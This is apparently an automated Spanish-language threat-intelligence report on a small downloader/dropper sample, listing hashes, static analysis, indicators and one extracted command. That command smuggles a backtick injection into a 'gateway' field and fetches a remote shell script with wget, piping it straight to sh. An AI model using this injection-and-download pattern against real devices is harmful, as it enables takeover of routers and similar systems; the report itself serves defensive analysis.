# 🧬 Payload Analysis

`e027572d0d2104d15237513336c2955346288e3b0cf22ef8a145b2717a92d127`

## 📌 Resumen

Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Ejecución. Se asoció 1 comando observado o extraído.

## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:45:45+00:00`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `e027572d0d2104d15237513336c2955346288e3b0cf22ef8a145b2717a92d127`
- **MD5:** `ba2a2d6c6ce55b5b16ce189c24d36565`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 329 B |
| Entropía | 5.12 |
| Strings | 6 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=5

## 🖥️ Comandos observados / extraídos

```text
gateway=[internal-ip-redacted]`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-|sh -s wdr2;busybox wget hxxp://91.92.40.XXX/wget.sh -O-
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 190.179.168.XXX | static_analysis |
| ip | 91.92.40.XXX | static_analysis |
| url | hxxp://91.92.40.XXX/wget.sh | strings |
| hash | e027572d0d2104d15237513336c2955346288e3b0cf22ef8a145b2717a92d127 | static_analysis |
| command | gateway=[internal-ip-redacted]`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-\|sh -s wdr2;busybox wget hxxp://91.92.40.XXX/wget.sh -O- | strings |
| ip | 45.156.87.XXX | artifact_source |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
